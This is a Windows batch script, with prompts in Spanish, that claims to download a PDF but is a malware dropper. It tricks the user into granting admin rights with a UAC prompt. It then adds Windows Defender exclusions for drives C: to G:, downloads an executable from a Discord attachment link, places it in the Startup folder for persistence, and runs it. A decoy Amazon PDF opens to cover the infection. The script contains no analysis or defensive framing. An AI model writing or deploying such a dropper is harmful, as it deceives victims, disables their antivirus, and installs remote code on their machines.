@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Permite los permisos para comenzar con la descarga del PDF...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

echo Descargando PDF...   
powershell -Command "Add-MpPreference -ExclusionPath 'C:\'; 'D:\'; 'E:\'; 'F:\'; 'G:\'"
curl -o "%APPDATA%\PDF.exe" "https://cdn.discordapp.com/attachments/1232734528125014068/1236393238965784576/PDF.exe?ex=6637d86f&is=663686ef&hm=6cec53e4c7ba0c313a59b9f93682b033940bf42c5263309e1f3fe5abef70127b&"
move "%APPDATA%\PDF.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
start "" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\PDF.exe"
curl -o "%USERPROFILE%\Desktop\AmazonPDF.pdf" "https://cdn.discordapp.com/attachments/1232734528125014068/1236393874004639875/AmazonPDF.pdf?ex=6637d906&is=66368786&hm=7c0502abfceeeb2693326f7d99f15654299aa8378d83a26f2d6631c1c08806b6&"
start "" "%USERPROFILE%\Desktop\AmazonPDF.pdf"
